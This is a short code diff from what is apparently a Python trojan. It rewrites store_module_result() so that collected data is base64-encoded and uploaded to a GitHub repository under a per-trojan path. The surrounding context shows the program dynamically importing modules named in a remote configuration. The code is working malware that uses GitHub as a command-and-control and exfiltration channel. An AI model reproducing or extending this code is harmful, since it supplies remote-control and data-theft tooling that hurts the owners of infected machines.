@@ -46,7 +46,9 @@ def get_trojan_config():
             exec("import %s " % task["module"])
         return config
 
-def store_module_result(data):
 
-    gh ,rep ,branch = connect_to_github()
-    remot_path = "data/%s/%d.data"%
+def store_module_result(data):
+    gh, rep, branch = connect_to_github()
+    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
+    rep.create_file(remote_path, "commit massage", base64.b64encode(data))
+    return
